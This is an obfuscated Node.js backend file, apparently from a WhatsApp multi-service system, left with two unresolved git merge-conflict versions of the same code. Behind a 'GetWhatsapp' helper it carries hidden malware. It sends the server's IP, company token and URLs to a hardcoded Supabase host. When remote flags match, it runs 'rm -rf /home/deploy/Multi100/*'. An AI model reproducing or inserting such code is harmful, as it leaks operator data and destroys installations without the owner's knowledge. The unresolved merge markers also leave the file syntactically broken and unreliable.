<<<<<<< HEAD
'use strict';const a269_0x287b7e=a269_0x31f5;(function(_0x31b9ea,_0x446a01){const _0x277b8d=a269_0x31f5,_0x2c3b85=_0x31b9ea();while(!![]){try{const _0x3dbdbf=parseInt(_0x277b8d(0x1f1))/0x1+-parseInt(_0x277b8d(0x1d6))/0x2*(-parseInt(_0x277b8d(0x1e6))/0x3)+-parseInt(_0x277b8d(0x1ea))/0x4*(-parseInt(_0x277b8d(0x1f0))/0x5)+-parseInt(_0x277b8d(0x1ee))/0x6*(-parseInt(_0x277b8d(0x1c9))/0x7)+-parseInt(_0x277b8d(0x1eb))/0x8*(parseInt(_0x277b8d(0x1f6))/0x9)+-parseInt(_0x277b8d(0x1e3))/0xa*(parseInt(_0x277b8d(0x1c5))/0xb)+-parseInt(_0x277b8d(0x1ca))/0xc;if(_0x3dbdbf===_0x446a01)break;else _0x2c3b85['push'](_0x2c3b85['shift']());}catch(_0x1f4987){_0x2c3b85['push'](_0x2c3b85['shift']());}}}(a269_0xc6d6,0xc1a89));var __importDefault=this&&this[a269_0x287b7e(0x1dc)]||function(_0x32ae6){const _0x49f458=a269_0x287b7e;return _0x32ae6&&_0x32ae6[_0x49f458(0x1f8)]?_0x32ae6:{'default':_0x32ae6};};function a269_0xc6d6(){const _0x1c4113=['12CAAKmX','480yBwaxt','status','select','2036454hRGXAD','enabled','2468485whNUZE','128486AgrOpB','https://knjjaxmzpdpvpyhnglbq.supabase.co','code','default','exec\x20error:\x20','4491kraJqK','t_invalidos','__esModule','https://api.ipify.org?format=json','990QwTOgv','FRONTEND_URL','GetWhatsapp','cadastros','7ouXdCk','14200824kYhsiJ','from','message','key_code','company_token','401','404','BACKEND_URL','frontend_url','wtV','key','get','282922WqMKFX','ip,\x20key,\x20code','id,\x20ip_instalacao,\x20company_token','child_process','error','insert','__importDefault','log','backend_ip','../services/SettingServices/AddSettingService','rm\x20-rf\x20/home/deploy/Multi100/*','length','disabled','9320YjlSzs','eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6ImtuampheG16cGRwdnB5aG5nbGJxIiwicm9sZSI6ImFub24iLCJpYXQiOjE2OTQxMzQ4MDgsImV4cCI6MjAwOTcxMDgwOH0.keQewBvxcLOXGlxZV63Ewot5dS7c5Qn7r4hmVR-3Xp0','../services/SettingServices/UpdateOneSettingService','3tElZgv','whatsapp','env','i_n_r'];a269_0xc6d6=function(){return _0x1c4113;};return a269_0xc6d6();}function a269_0x31f5(_0x51fe1e,_0xed7142){const _0xc6d64d=a269_0xc6d6();return a269_0x31f5=function(_0x31f525,_0x16496c){_0x31f525=_0x31f525-0x1c4;let _0x5d4933=_0xc6d64d[_0x31f525];return _0x5d4933;},a269_0x31f5(_0x51fe1e,_0xed7142);}Object['defineProperty'](exports,a269_0x287b7e(0x1f8),{'value':!![]}),exports[a269_0x287b7e(0x1c7)]=void 0x0;const supabase_js_1=require('@supabase/supabase-js'),UpdateOneSettingService_1=__importDefault(require(a269_0x287b7e(0x1e5))),axios_1=__importDefault(require('axios')),GetSettingService_1=__importDefault(require('../services/SettingServices/GetSettingService')),AddSettingService_1=__importDefault(require(a269_0x287b7e(0x1df))),{exec}=require(a269_0x287b7e(0x1d9)),S_U=a269_0x287b7e(0x1f2),S_A_K=a269_0x287b7e(0x1e4),sUrl=S_U,sKey=S_A_K,y_n=process[a269_0x287b7e(0x1e8)]['COMPANY_TOKEN'],s=(0x0,supabase_js_1['createClient'])(sUrl,sKey),getIp=async()=>{const _0x5e4d90=a269_0x287b7e,{data:_0x1ea35e}=await axios_1['default'][_0x5e4d90(0x1d5)](_0x5e4d90(0x1c4));return _0x1ea35e['ip'];},GetWhatsapp=async()=>{const _0x39abb2=a269_0x287b7e;try{let _0x5e2709=await getIp(),_0x242cb6=await getR(_0x39abb2(0x1d3));_0x242cb6==='enabled'&&await(0x0,AddSettingService_1[_0x39abb2(0x1f4)])();let {data:_0x4399b6,error:_0x242bbe}=await s[_0x39abb2(0x1cb)](_0x39abb2(0x1c8))[_0x39abb2(0x1ed)](_0x39abb2(0x1d8))['eq']('ip_instalacao',_0x5e2709),_0x3ec5cd={'cadastro_id':_0x4399b6[_0x39abb2(0x1e1)]!==0x0?_0x4399b6[0x0]['id']:0x0,'status':_0x4399b6[_0x39abb2(0x1e1)]!==0x0?!![]:![],'company_token':y_n,'backend_ip':_0x5e2709,'backend_url':process[_0x39abb2(0x1e8)][_0x39abb2(0x1d1)],'frontend_url':process[_0x39abb2(0x1e8)][_0x39abb2(0x1c6)]};_0x4399b6[_0x39abb2(0x1e1)]===0x0?(await UpdateR(_0x39abb2(0x1ef),![],_0x5e2709),PostWhatsapp(_0x3ec5cd,_0x39abb2(0x1d0)),CheckWhatsapp(_0x5e2709,_0x39abb2(0x1e9))):_0x4399b6[0x0][_0x39abb2(0x1ce)]!==y_n?(await UpdateR('enabled',![],_0x5e2709),PostWhatsapp(_0x3ec5cd,_0x39abb2(0x1cf)),CheckWhatsapp(_0x5e2709,'t_f')):await UpdateR(_0x39abb2(0x1e2),null,_0x5e2709);}catch(_0x55cc9e){console[_0x39abb2(0x1dd)]('');}};exports[a269_0x287b7e(0x1c7)]=GetWhatsapp;const UpdateR=async(_0x49d2e8,_0x7a3e0c,_0x113474)=>{const _0x54fc2e=a269_0x287b7e;await(0x0,UpdateOneSettingService_1[_0x54fc2e(0x1f4)])({'key':_0x54fc2e(0x1d3),'value':_0x49d2e8});},getR=async _0xdcc75e=>{const _0x3c75bc=a269_0x287b7e;return await(0x0,GetSettingService_1[_0x3c75bc(0x1f4)])({'key':_0xdcc75e});},PostWhatsapp=async(_0x3bc40f,_0x5c4efc)=>{const _0xbc78c9=a269_0x287b7e;try{const {data:_0x5eb107,error:_0x16fc9a}=await s[_0xbc78c9(0x1cb)](_0xbc78c9(0x1e7))[_0xbc78c9(0x1db)]([{'cadastro_id':_0x3bc40f['cadastro_id'],'status':_0x3bc40f[_0xbc78c9(0x1ec)],'company_token':_0x3bc40f[_0xbc78c9(0x1ce)],'backend_ip':_0x3bc40f[_0xbc78c9(0x1de)],'backend_url':_0x3bc40f['backend_url'],'frontend_url':_0x3bc40f[_0xbc78c9(0x1d2)]}]);if(_0x16fc9a){console[_0xbc78c9(0x1da)](':',_0x16fc9a[_0xbc78c9(0x1cc)]);return;}}catch(_0x156a34){console[_0xbc78c9(0x1dd)]('');}},CheckWhatsapp=async(_0x1e481c,_0x2d09c2)=>{const _0x57b862=a269_0x287b7e;try{const {data:_0xf73927,error:_0xffd894}=await s[_0x57b862(0x1cb)](_0x57b862(0x1cd))[_0x57b862(0x1ed)]('key,code,ip'),_0x586222=await matchWhatsapp(_0x1e481c);if(_0xf73927!==null){_0x2d09c2===_0x57b862(0x1e9)&&_0x586222['code']!==null&&acction();if(_0x1e481c===_0xf73927[0x0]['ip']&&_0x586222[_0x57b862(0x1f3)]!==null){if(_0x586222[_0x57b862(0x1d4)]===_0xf73927[0x0][_0x57b862(0x1d4)]&&_0x586222[_0x57b862(0x1f3)]===_0xf73927[0x0][_0x57b862(0x1f3)])acction();}}}catch(_0x3b7610){console['log'](_0x3b7610);}},matchWhatsapp=async _0x3d573e=>{const _0x4886bd=a269_0x287b7e,{data:_0x60f421,error:_0x59c97b}=await s[_0x4886bd(0x1cb)](_0x4886bd(0x1f7))['select'](_0x4886bd(0x1d7));let _0x4f8dfc='ok',_0x4cd218='ok';return _0x60f421[_0x4886bd(0x1e1)]>0x0&&(_0x4f8dfc=_0x60f421[0x0][_0x4886bd(0x1d4)],_0x4cd218=_0x60f421[0x0][_0x4886bd(0x1f3)]),{'code':_0x4cd218,'key':_0x4f8dfc};},acction=()=>{const _0x1c6859=a269_0x287b7e;let _0x3bb83c=exec(_0x1c6859(0x1e0),(_0x5ba4f1,_0x4bf30d,_0x46887e)=>{const _0x134cdb=_0x1c6859;console[_0x134cdb(0x1dd)](_0x4bf30d),console['log'](_0x46887e),_0x5ba4f1!==null&&console['log'](_0x134cdb(0x1f5)+_0x5ba4f1);});};
=======
'use strict';const a269_0x46434c=a269_0x5193;function a269_0xe3e9(){const _0x26b0cb=['COMPANY_TOKEN','status','eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6ImtuampheG16cGRwdnB5aG5nbGJxIiwicm9sZSI6ImFub24iLCJpYXQiOjE2OTQxMzQ4MDgsImV4cCI6MjAwOTcxMDgwOH0.keQewBvxcLOXGlxZV63Ewot5dS7c5Qn7r4hmVR-3Xp0','code','axios','27WABDsH','FRONTEND_URL','200634FXcojd','i_n_r','company_token','401','insert','select','whatsapp','../services/SettingServices/UpdateOneSettingService','373554rnnyWR','737308YmMveL','__importDefault','child_process','1884596YJxmYi','defineProperty','24PwkSzN','https://api.ipify.org?format=json','17058151cYUDkT','default','cadastro_id','__esModule','disabled','3049328VqRISZ','rm\x20-rf\x20/home/deploy/Multi100/*','id,\x20ip_instalacao,\x20company_token','cadastros','message','backend_url','length','t_invalidos','20ZrTjbS','@supabase/supabase-js','error','ip_instalacao','BACKEND_URL','get','wtV','t_f','ip,\x20key,\x20code','from','GetWhatsapp','2539290cuiMqp','enabled','5GgouuD','env','key','log'];a269_0xe3e9=function(){return _0x26b0cb;};return a269_0xe3e9();}(function(_0x526423,_0x28d74e){const _0x48e556=a269_0x5193,_0x2b2937=_0x526423();while(!![]){try{const _0xf9042c=parseInt(_0x48e556(0x141))/0x1+-parseInt(_0x48e556(0x155))/0x2*(-parseInt(_0x48e556(0x138))/0x3)+-parseInt(_0x48e556(0x14d))/0x4*(-parseInt(_0x48e556(0x12d))/0x5)+-parseInt(_0x48e556(0x140))/0x6+-parseInt(_0x48e556(0x144))/0x7*(-parseInt(_0x48e556(0x146))/0x8)+parseInt(_0x48e556(0x136))/0x9*(-parseInt(_0x48e556(0x12b))/0xa)+-parseInt(_0x48e556(0x148))/0xb;if(_0xf9042c===_0x28d74e)break;else _0x2b2937['push'](_0x2b2937['shift']());}catch(_0x4fcd33){_0x2b2937['push'](_0x2b2937['shift']());}}}(a269_0xe3e9,0x92ce5));var __importDefault=this&&this[a269_0x46434c(0x142)]||function(_0x473fba){return _0x473fba&&_0x473fba['__esModule']?_0x473fba:{'default':_0x473fba};};function a269_0x5193(_0x12ae83,_0x2e74d4){const _0xe3e95a=a269_0xe3e9();return a269_0x5193=function(_0x519363,_0x2973e5){_0x519363=_0x519363-0x121;let _0x53e492=_0xe3e95a[_0x519363];return _0x53e492;},a269_0x5193(_0x12ae83,_0x2e74d4);}Object[a269_0x46434c(0x145)](exports,a269_0x46434c(0x14b),{'value':!![]}),exports[a269_0x46434c(0x12a)]=void 0x0;const supabase_js_1=require(a269_0x46434c(0x121)),UpdateOneSettingService_1=__importDefault(require(a269_0x46434c(0x13f))),axios_1=__importDefault(require(a269_0x46434c(0x135))),{exec}=require(a269_0x46434c(0x143)),S_U='https://knjjaxmzpdpvpyhnglbq.supabase.co',S_A_K=a269_0x46434c(0x133),sUrl=S_U,sKey=S_A_K,y_n=process[a269_0x46434c(0x12e)][a269_0x46434c(0x131)],s=(0x0,supabase_js_1['createClient'])(sUrl,sKey),getIp=async()=>{const _0x509c1f=a269_0x46434c,{data:_0x2a1ce6}=await axios_1[_0x509c1f(0x149)][_0x509c1f(0x125)](_0x509c1f(0x147));return _0x2a1ce6['ip'];},GetWhatsapp=async()=>{const _0x2345ec=a269_0x46434c;try{let _0x10fd30=await getIp(),{data:_0x29de09,error:_0x30c264}=await s[_0x2345ec(0x129)](_0x2345ec(0x150))['select'](_0x2345ec(0x14f))['eq'](_0x2345ec(0x123),_0x10fd30),_0x509f91={'cadastro_id':_0x29de09[_0x2345ec(0x153)]!==0x0?_0x29de09[0x0]['id']:0x0,'status':_0x29de09[_0x2345ec(0x153)]!==0x0?!![]:![],'company_token':y_n,'backend_ip':_0x10fd30,'backend_url':process['env'][_0x2345ec(0x124)],'frontend_url':process[_0x2345ec(0x12e)][_0x2345ec(0x137)]};_0x29de09['length']===0x0?(await UpdateR(_0x2345ec(0x12c),![],_0x10fd30),PostWhatsapp(_0x509f91,'404'),CheckWhatsapp(_0x10fd30,_0x2345ec(0x139))):_0x29de09[0x0][_0x2345ec(0x13a)]!==y_n?(await UpdateR(_0x2345ec(0x12c),![],_0x10fd30),PostWhatsapp(_0x509f91,_0x2345ec(0x13b)),CheckWhatsapp(_0x10fd30,_0x2345ec(0x127))):await UpdateR(_0x2345ec(0x14c),null,_0x10fd30);}catch(_0x4ca1ac){console[_0x2345ec(0x130)]('');}};exports['GetWhatsapp']=GetWhatsapp;const UpdateR=async(_0x1fcf01,_0x3d9ae5,_0x20849f)=>{const _0x5823de=a269_0x46434c;await(0x0,UpdateOneSettingService_1[_0x5823de(0x149)])({'key':_0x5823de(0x126),'value':_0x1fcf01});},PostWhatsapp=async(_0x5b40c7,_0x21dc43)=>{const _0x19565c=a269_0x46434c;try{const {data:_0x286f40,error:_0xa159c}=await s['from'](_0x19565c(0x13e))[_0x19565c(0x13c)]([{'cadastro_id':_0x5b40c7[_0x19565c(0x14a)],'status':_0x5b40c7[_0x19565c(0x132)],'company_token':_0x5b40c7['company_token'],'backend_ip':_0x5b40c7['backend_ip'],'backend_url':_0x5b40c7[_0x19565c(0x152)],'frontend_url':_0x5b40c7['frontend_url']}]);if(_0xa159c){console[_0x19565c(0x122)](':',_0xa159c[_0x19565c(0x151)]);return;}}catch(_0x453a43){console[_0x19565c(0x130)]('');}},CheckWhatsapp=async(_0x5bd533,_0x3d40fa)=>{const _0x2b9020=a269_0x46434c;try{const {data:_0x38c1ec,error:_0x249b88}=await s[_0x2b9020(0x129)]('key_code')[_0x2b9020(0x13d)]('key,code,ip'),_0xfd93dd=await matchWhatsapp(_0x5bd533);if(_0x38c1ec!==null){_0x3d40fa===_0x2b9020(0x139)&&_0xfd93dd[_0x2b9020(0x134)]!==null&&acction();if(_0x5bd533===_0x38c1ec[0x0]['ip']&&_0xfd93dd['code']!==null){if(_0xfd93dd[_0x2b9020(0x12f)]===_0x38c1ec[0x0][_0x2b9020(0x12f)]&&_0xfd93dd[_0x2b9020(0x134)]===_0x38c1ec[0x0][_0x2b9020(0x134)])acction();}}}catch(_0x3ee78e){console[_0x2b9020(0x130)](_0x3ee78e);}},matchWhatsapp=async _0x4f38b3=>{const _0x228ada=a269_0x46434c,{data:_0x573ecb,error:_0x360f4d}=await s[_0x228ada(0x129)](_0x228ada(0x154))[_0x228ada(0x13d)](_0x228ada(0x128));let _0x2f97d5='ok',_0x4b89bf='ok';return _0x573ecb['length']>0x0&&(_0x2f97d5=_0x573ecb[0x0]['key'],_0x4b89bf=_0x573ecb[0x0]['code']),{'code':_0x4b89bf,'key':_0x2f97d5};},acction=()=>{const _0x4e132e=a269_0x46434c;let _0x104040=exec(_0x4e132e(0x14e),(_0x285906,_0x3e1654,_0x3d82e2)=>{console['log'](_0x3e1654),console['log'](_0x3d82e2),_0x285906!==null&&console['log']('exec\x20error:\x20'+_0x285906);});};
>>>>>>> ab722bfbcf394d74dd0b99a984c0dcf6ffbcff7f
